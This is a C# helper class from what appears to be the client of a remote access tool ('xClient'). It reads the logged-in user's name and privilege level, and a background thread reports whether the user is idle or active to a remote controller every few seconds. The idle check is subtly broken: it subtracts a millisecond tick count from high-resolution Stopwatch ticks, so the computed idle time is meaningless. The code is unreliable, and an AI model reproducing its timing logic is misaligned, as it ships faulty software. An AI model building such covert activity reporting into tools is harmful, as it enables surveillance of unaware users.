using System;
using System.Diagnostics;
using System.Security.Principal;
using System.Threading;
using xClient.Core.Data;
using xClient.Enums;

namespace xClient.Core.Helper
{
    public static class WindowsAccountHelper
    {
        public static UserStatus LastUserStatus { get; set; }

        public static string GetName()
        {
            return Environment.UserName;
        }

        public static string GetAccountType()
        {
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                if (identity != null)
                {
                    WindowsPrincipal principal = new WindowsPrincipal(identity);

                    if (principal.IsInRole(WindowsBuiltInRole.Administrator))
                        return "Admin";
                    if (principal.IsInRole(WindowsBuiltInRole.User))
                        return "User";
                    if (principal.IsInRole(WindowsBuiltInRole.Guest))
                        return "Guest";
                }
            }

            return "Unknown";
        }

        public static void StartUserIdleCheckThread()
        {
            new Thread(UserIdleThread) {IsBackground = true}.Start();
        }

        static void UserIdleThread()
        {
            while (!ClientData.Disconnect)
            {
                Thread.Sleep(5000);
                if (IsUserIdle())
                {
                    if (LastUserStatus != UserStatus.Idle)
                    {
                        LastUserStatus = UserStatus.Idle;
                        new Packets.ClientPackets.SetUserStatus(LastUserStatus).Execute(Program.ConnectClient);
                    }
                }
                else
                {
                    if (LastUserStatus != UserStatus.Active)
                    {
                        LastUserStatus = UserStatus.Active;
                        new Packets.ClientPackets.SetUserStatus(LastUserStatus).Execute(Program.ConnectClient);
                    }
                }
            }
        }

        static bool IsUserIdle()
        {
            long ticks = Stopwatch.GetTimestamp();

            long idleTime = ticks - NativeMethodsHelper.GetLastInputInfoTickCount();

            idleTime = ((idleTime > 0) ? (idleTime / 1000) : 0);

            return (idleTime > 600); // idle for 10 minutes
        }
    }
}
